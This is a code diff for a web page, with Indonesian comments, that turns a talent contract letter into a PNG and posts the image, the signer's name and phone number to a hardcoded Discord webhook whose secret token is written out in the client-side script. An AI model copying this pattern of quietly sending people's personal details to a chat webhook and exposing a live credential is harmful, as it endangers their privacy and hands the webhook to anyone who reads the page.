@@ -321,34 +321,34 @@ function buatSurat(){
 async function generatePNG(){
     document.getElementById("bannerWeb").style.display="none";
 
-    const pages = [
-        {id:"page1", name:"surat-halaman-1.png"},
-        {id:"page2", name:"surat-halaman-2.png"}
-    ];
+    const el = document.getElementById("page1");
 
-    for(const p of pages){
-        const el = document.getElementById(p.id);
+    const canvas = await html2canvas(el,{
+        scale: 3,
+        backgroundColor:"#fff",
+        useCORS:true
+    });
 
-        const canvas = await html2canvas(el,{
-            scale: 3,
-            backgroundColor:"#fff",
-            useCORS:true
-        });
+    const filename = "surat-kontrak.png";
 
-        // DOWNLOAD (optional, kalau mau tetap download)
-        const link = document.createElement("a");
-        link.download = p.name;
-        link.href = canvas.toDataURL("image/png");
-        link.click();
+    // OPTIONAL: tetap download ke device
+    const link = document.createElement("a");
+    link.download = filename;
+    link.href = canvas.toDataURL("image/png");
+    link.click();
 
-        // ✅ LANGSUNG UPLOAD KE DISCORD
-        await uploadToDiscord(canvas, p.name);
-    }
+    // ambil nama & hp dari form
+    const nama = document.getElementById("nama").value;
+    const hp = document.getElementById("hp").value;
+
+    // upload ke discord dengan content custom
+    await uploadToDiscord(canvas, filename, nama, hp);
 
     document.getElementById("bannerWeb").style.display="flex";
 }
+
     
-    async function uploadToDiscord(canvas, filename) {
+async function uploadToDiscord(canvas, filename, nama, hp) {
     const webhookURL = "https://discord.com/api/webhooks/1475497609148895304/aZfTvJad6WjoGOZv4lncDX3GptOBm_1we6b38tsobbUoQ9Hv7LUFHi0EtbfeRaIIPb3-";
 
     const blob = await new Promise(resolve =>
@@ -357,7 +357,11 @@ async function generatePNG(){
 
     const formData = new FormData();
     formData.append("file", blob, filename);
-    formData.append("content", "📄 Surat kontrak otomatis");
+    formData.append("content", 
+        "📄 SURAT KONTRAK TALENT\n\n" +
+        "👤 Nama: " + nama + "\n" +
+        "📱 No HP: " + hp
+    );
 
     await fetch(webhookURL, {
         method: "POST",
@@ -369,6 +373,7 @@ async function generatePNG(){
 
 </body>
 </html>
+
 
 
 
